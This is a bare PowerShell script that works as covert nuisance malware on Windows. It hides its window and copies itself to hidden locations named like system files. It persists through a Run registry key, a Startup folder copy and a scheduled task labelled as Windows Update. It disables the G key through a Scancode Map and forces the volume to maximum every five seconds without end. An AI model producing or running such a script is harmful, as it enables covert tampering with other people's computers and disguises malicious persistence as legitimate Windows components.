
param()


Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)


$scriptPath = $MyInvocation.MyCommand.Path
$persistencePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.ps1"
$hiddenPath = "$env:TEMP\winupdate.ps1"


Copy-Item $scriptPath $hiddenPath -Force
Copy-Item $scriptPath $persistencePath -Force


$file = Get-Item $hiddenPath -Force
$file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden


New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$hiddenPath`"" -PropertyType String -Force


function Set-MaxVolume {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class Audio {
        [DllImport("winmm.dll")]
        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
    }
'@
    [Audio]::waveOutSetVolume([IntPtr]::Zero, 0xFFFF)
}


function Disable-GKey {

    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout"
    
    # CORRECTED binary data to disable G key
    # Header (8 bytes): 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    # Count (4 bytes): 0x02,0x00,0x00,0x00 (1 mapping + 1 terminator)
    # Mapping (8 bytes): 0x22,0x00,0x00,0x00 (G key), 0x00,0x00,0x00,0x00 (to null)
    # Terminator (4 bytes): 0x00,0x00,0x00,0x00
    $remapData = [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x22,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
    
    New-ItemProperty -Path $regPath -Name "Scancode Map" -Value $remapData -PropertyType Binary -Force
}


Set-MaxVolume
Disable-GKey


$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$hiddenPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -RunLevel Highest -Force


while ($true) {
    Set-MaxVolume
    Start-Sleep -Seconds 5
}
